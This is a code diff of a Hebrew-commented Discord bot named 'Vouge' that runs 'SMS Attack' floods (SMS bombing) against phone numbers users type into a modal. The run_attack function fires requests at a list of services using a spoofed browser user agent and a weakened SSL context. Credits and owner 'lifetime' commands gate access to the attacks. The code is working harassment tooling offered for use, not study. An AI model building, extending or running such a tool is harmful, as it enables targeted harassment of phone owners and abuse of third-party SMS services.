@@ -5,16 +5,21 @@ import os, json, httpx, asyncio, datetime, ssl
 from flask import Flask
 from threading import Thread
 
-# --- Render Keep-Alive ---
+# --- Render Keep-Alive & Port Binding ---
 app = Flask('')
 @app.route('/')
 def home(): return "Bot Online"
-def run():
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
-def keep_alive():
-    Thread(target=run).start()
 
-# --- הגדרות ---
+def run():
+    # Render מחייב האזנה לפורט שהם נותנים
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
+
+def keep_alive():
+    t = Thread(target=run)
+    t.start()
+
+# --- הגדרות בוט ---
 TOKEN = os.getenv("DISCORD_TOKEN")
 OWNER_ROLE_NAME = "Owner"
 MY_USER_ID = 1499077731659284540 
@@ -38,7 +43,7 @@ async def send_log(bot, title, description, color=discord.Color.blue()):
     except Exception as e:
         print(f"Log Error: {e}")
 
-# --- מנוע תקיפה משופר ---
+# --- מנוע תקיפה עם עקיפת SSL ו-User Agent ---
 def create_ssl_context():
     context = ssl.create_default_context()
     context.set_ciphers('DEFAULT@SECLEVEL=1')
@@ -49,7 +54,7 @@ def create_ssl_context():
 async def run_attack(phone):
     clean_p = phone[1:] if phone.startswith('0') else phone
     success, failed = 0, 0
-    
+    # תיקון ה-User Agent שגרם לשגיאה בתמונה
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     
     targets = [
@@ -69,7 +74,7 @@ async def run_attack(phone):
             except: failed += 1
     return success, failed
 
-# --- UI: פאנל שליטה ---
+# --- ממשק דיסקורד ---
 class AttackModal(discord.ui.Modal, title="Vouge - SMS Attack"):
     phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)
     async def on_submit(self, interaction: discord.Interaction):
@@ -88,7 +93,7 @@ class AttackModal(discord.ui.Modal, title="Vouge - SMS Attack"):
             data["credits"][uid] -= 1
             save_data(data)
 
-        await interaction.response.send_message(f"💣 תקיפה על {self.phone.value} יצאה לדרך!", ephemeral=True)
+        await interaction.response.send_message(f"💣 תקיפה על {self.phone.value} החלה!", ephemeral=True)
         s, f = await run_attack(self.phone.value)
         
         report = f"**משתמש:** {interaction.user.mention}\n**יעד:** {self.phone.value}\n✅ הצלחות: `{s}` | ❌ כשלונות: `{f}`"
@@ -100,7 +105,6 @@ class ControlPanelView(discord.ui.View):
     async def at_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(AttackModal())
 
-# --- Bot Core ---
 class MyBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.default()
@@ -116,4 +120,29 @@ bot = MyBot()
 def is_owner(interaction: discord.Interaction):
     return discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME) or interaction.user.id == MY_USER_ID
 
-@bot.
+# --- פקודות ---
+@bot.tree.command(name="setup")
+async def setup(interaction: discord.Interaction):
+    if not is_owner(interaction): return await interaction.response.send_message("❌ חסום", ephemeral=True)
+    embed = discord.Embed(title="🛡️ Vouge Panel", color=discord.Color.red())
+    await interaction.response.send_message(embed=embed, view=ControlPanelView())
+
+@bot.tree.command(name="lifetime")
+async def lifetime(interaction: discord.Interaction, member: discord.Member):
+    if not is_owner(interaction): return
+    data = get_data()
+    data["credits"][str(member.id)] = 999999
+    save_data(data)
+    await interaction.response.send_message(f"👑 {member.mention} קיבל לייפטיים!")
+
+@bot.tree.command(name="remove_lifetime")
+async def rm_lifetime(interaction: discord.Interaction, member: discord.Member):
+    if not is_owner(interaction): return
+    data = get_data()
+    data["credits"][str(member.id)] = 0
+    save_data(data)
+    await interaction.response.send_message(f"🚫 הוסר לייפטיים ל-{member.mention}")
+
+if __name__ == "__main__":
+    keep_alive()
+    bot.run(TOKEN)
